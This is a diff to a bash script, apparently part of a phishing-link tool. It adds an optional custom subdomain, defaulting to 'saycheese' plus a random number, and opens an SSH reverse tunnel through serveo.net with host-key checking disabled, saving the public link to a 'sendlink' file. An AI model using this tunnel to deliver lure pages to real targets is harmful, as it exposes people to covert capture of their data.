@@ -238,6 +238,20 @@ command -v ssh > /dev/null 2>&1 || { echo >&2 "I require SSH but it's not instal
 if [[ -e sendlink ]]; then
 rm -rf sendlink
 fi
+
+if [[ $subdomain_resp == true ]]; then
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net  2> /dev/null > sendlink ' &
+
+sleep 8
+
+else
+
+$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink ' &
+
+sleep 8
+
+fi
 $(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:'$port' serveo.net 2> /dev/null > sendlink ' &
 printf "\n"
 sleep 4 # &
@@ -265,6 +279,19 @@ fi
 if [[ -e server/error.txt ]]; then
 rm -rf server/error.txt
 
+fi
+
+default_choose_sub="Y"
+default_subdomain="saycheese$RANDOM"
+
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Choose subdomain? (Default:\e[0m\e[1;77m [Y/n] \e[0m\e[1;33m): \e[0m'
+read choose_sub
+choose_sub="${choose_sub:-${default_choose_sub}}"
+if [[ $choose_sub == "Y" || $choose_sub == "y" || $choose_sub == "Yes" || $choose_sub == "yes" ]]; then
+subdomain_resp=true
+printf '\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m] Subdomain: (Default:\e[0m\e[1;77m %s \e[0m\e[1;33m): \e[0m' $default_subdomain
+read subdomain
+subdomain="${subdomain:-${default_subdomain}}"
 fi
 
 default_port="55333" #$(seq 1111 4444 | sort -R | head -n1)
